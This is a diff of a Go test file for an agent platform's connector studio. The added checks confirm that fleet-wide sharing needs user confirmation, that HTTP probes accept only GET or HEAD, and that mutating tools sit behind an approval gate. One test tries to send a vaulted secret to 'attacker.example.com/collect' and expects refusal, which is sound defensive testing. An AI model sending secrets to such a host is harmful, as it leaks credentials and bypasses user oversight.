@@ -290,7 +290,31 @@ func TestConnectorStudioCreateAndTestCustomHTTPConnector(t *testing.T) {
 		t.Fatalf("unexpected catalog_matches: %#v", searchMap["catalog_matches"])
 	}
 
-	// 2. Create custom HTTP connector with vaulted secret and fleet-wide share_scope.
+	// 2a. Reject share_scope="everyone" before the user confirms fleet-wide sharing.
+	_, err = h(context.Background(), tools.ConnectorStudioParams{
+		Action:     tools.ConnectorStudioActionCreateCustom,
+		Name:       "acme_ads",
+		URL:        upstream.URL,
+		Transport:  "http_tools",
+		ShareScope: "everyone",
+		SecretRef:  "$secret:api_key",
+		CustomTools: []tools.ConnectorStudioToolSpec{
+			{
+				Name:        "list_campaigns",
+				Description: "List active campaigns from Acme Ads.",
+				Method:      "GET",
+				URL:         upstream.URL + "/v1/campaigns",
+			},
+		},
+	})
+	if err == nil || !strings.Contains(err.Error(), "requires explicit user confirmation") {
+		t.Fatalf("expected share_scope=everyone without user confirmation to be rejected, got %v", err)
+	}
+
+	// Simulate user submitting share_scope="everyone" in show_ui.
+	s.uiSecrets.setAllowEveryone("admin@example.com", conv.ID, true)
+
+	// 2b. Create custom HTTP connector with vaulted secret and fleet-wide share_scope.
 	createRes, err := h(context.Background(), tools.ConnectorStudioParams{
 		Action:     tools.ConnectorStudioActionCreateCustom,
 		Name:       "acme_ads",
@@ -378,7 +402,7 @@ func TestConnectorStudioCreateAndTestCustomHTTPConnector(t *testing.T) {
 		t.Fatalf("expected cross-origin rejection error, got %v", err)
 	}
 
-	// 6. Reject sending vaulted secret to an unconfirmed origin in probe_http.
+	// 6. Reject sending vaulted secret to an unconfirmed origin in probe_http, and reject POST in probe_http.
 	_, err = h(context.Background(), tools.ConnectorStudioParams{
 		Action:    tools.ConnectorStudioActionProbeHTTP,
 		URL:       "https://attacker.example.com/collect",
@@ -387,8 +411,16 @@ func TestConnectorStudioCreateAndTestCustomHTTPConnector(t *testing.T) {
 	if err == nil || !strings.Contains(err.Error(), "not authorized for host") {
 		t.Fatalf("expected unconfirmed origin error for probe_http, got %v", err)
 	}
+	_, err = h(context.Background(), tools.ConnectorStudioParams{
+		Action: tools.ConnectorStudioActionProbeHTTP,
+		URL:    upstream.URL + "/v1/campaigns",
+		Method: "POST",
+	})
+	if err == nil || !strings.Contains(err.Error(), "only supports read-only GET or HEAD") {
+		t.Fatalf("expected probe_http POST rejection, got %v", err)
+	}
 
-	// 7. Updating with share_scope="personal" revokes everyone share, and POST tools register as critical.
+	// 7. Updating with share_scope="personal" revokes everyone share, and POST tools carry per-run Critical metadata and require approval gate instead of test_custom_tool.
 	_, err = h(context.Background(), tools.ConnectorStudioParams{
 		Action:     tools.ConnectorStudioActionCreateCustom,
 		Name:       "acme_ads",
@@ -418,10 +450,28 @@ func TestConnectorStudioCreateAndTestCustomHTTPConnector(t *testing.T) {
 	if len(sharedAfter) != 0 {
 		t.Fatalf("expected everyone share to be revoked after personal update, got %v", sharedAfter)
 	}
-	if !agentcore.IsCriticalTool("mcp_acme_ads_archive_item") {
-		t.Errorf("expected POST custom tool mcp_acme_ads_archive_item to be critical")
+	_, err = h(context.Background(), tools.ConnectorStudioParams{
+		Action:   tools.ConnectorStudioActionTestCustomTool,
+		Name:     "acme_ads",
+		ToolName: "archive_item",
+	})
+	if err == nil || !strings.Contains(err.Error(), "approval gate") {
+		t.Fatalf("expected test_custom_tool to refuse mutating POST tool archive_item, got %v", err)
 	}
-	if agentcore.IsCriticalTool("mcp_acme_ads_list_campaigns") {
-		t.Errorf("expected GET custom tool mcp_acme_ads_list_campaigns not to be critical")
+	ov, _ := agent.BuildRemoteMCPOverlay(context.Background(), rmcp, "admin@example.com", nil, agent.RemoteMCPAllConnected)
+	toolsByName := map[string]bool{}
+	for _, st := range ov.Catalog {
+		if st.ServerName == "acme_ads" {
+			toolsByName[st.Tool.Name] = st.Tool.Critical
+		}
+	}
+	if !toolsByName["archive_item"] {
+		t.Errorf("expected POST custom tool archive_item to have Critical=true in overlay catalog")
+	}
+	if toolsByName["list_campaigns"] {
+		t.Errorf("expected GET custom tool list_campaigns to have Critical=false in overlay catalog")
+	}
+	if agentcore.IsCriticalTool("mcp_acme_ads_archive_item") {
+		t.Errorf("expected custom tool criticality to be per-run rather than process-global")
 	}
 }
